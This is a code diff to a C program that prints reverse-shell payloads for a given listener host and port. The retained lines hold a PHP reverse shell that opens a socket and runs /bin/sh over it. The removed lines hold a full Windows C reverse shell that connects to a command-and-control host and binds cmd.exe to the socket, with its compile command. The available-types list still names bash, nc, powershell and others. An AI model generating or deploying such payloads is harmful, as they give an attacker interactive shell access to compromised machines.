@@ -64,23 +64,7 @@ int rev_shell(char* lhost,char* lport,char* type) {
     check = strcmp(type,"php");
     if (check == 0){
         printf("PHP:\n<?php\n$sock=fsockopen(\"%s\",%s);\n$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);\n?>\n",lhost,lport);
-    }
-    check = strcmp(type,"windows");
-    if (check == 0){
-        printf("#include <winsock2.h>\n#include <windows.h>\n#include <ws2tcpip.h>\n#include <stdio.h>\n\n#define DEFAULT_BUFLEN 1024\n\n");
-        printf("void RunShell(char* C2Server, int C2Port) {\n\tSOCKET mySocket;\n\tstruct sockaddr_in addr;\n\tWSADATA version;\n\t");
-        printf("WSAStartup(MAKEWORD(2,2), &version);\n\tmySocket = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);\n\taddr.sin_family = AF_INET;\n\n\t");
-        printf("addr.sin_addr.s_addr = inet_addr(C2Server);\n\taddr.sin_port = htons(C2Port);\n\n\t");
-        printf("if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), 0, 0, 0, 0)==SOCKET_ERROR) {\n\t\tclosesocket(mySocket);\n\t\t");
-        printf("WSACleanup();\n\t} else {\n\t\tprintf(\"Connected to %%s:%%d\\\\n\", C2Server, C2Port);\n\n\t\tchar Process[] = \"cmd.exe\";\n\t\t");
-        printf("STARTUPINFO sinfo;\n\t\tPROCESS_INFORMATION pinfo;\n\t\tmemset(&sinfo, 0, sizeof(sinfo));\n\t\tsinfo.cb = sizeof(sinfo);\n\t\t");
-        printf("sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);\n\t\tsinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket;\n\t\t");
-        printf(" CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);\n\n\t\tprintf(\"Process Created %%lu\\\\n\", pinfo.dwProcessId);\n\n\t\t");
-        printf("WaitForSingleObject(pinfo.hProcess, INFINITE);\n\t\tCloseHandle(pinfo.hProcess);\n\t\tCloseHandle(pinfo.hThread);\n\t}\n}\n\n");
-        printf("int main(int argc, char **argv) {\n\tif (argc == 3) {\n\t\tint port  = atoi(argv[2]);\n\t\tRunShell(argv[1], port);\n\t}\n\telse {\n\t\t");
-        printf("char host[] = \"%s\";\n\t\tint port = %s;\n\t\tRunShell(host, port);\n\t}\n\treturn 0;\n}",lhost,lport);
-        printf("\n\nCompile with: x86_64-w64-mingw32-gcc revshell.c -o revshell.exe -lwsock32 -lws2_32\n");
-    }    
+    }   
 }
 
 int main(int argc, char* argv[]) { 
@@ -95,7 +79,7 @@ int main(int argc, char* argv[]) {
         check_upgrade = strcmp(argv[1],"upgrades");
         if (check_types == 0){
         printf("Available types:\n");
-        printf("bash\nmkfifo\nnc\npowercat\npowershell\npython\nphp\nwindows\n");
+        printf("bash\nmkfifo\nnc\npowercat\npowershell\npython\nphp\n\n");
         }
         else if (check_upgrade == 0){
         upgrade(argv[1],argv[2]);
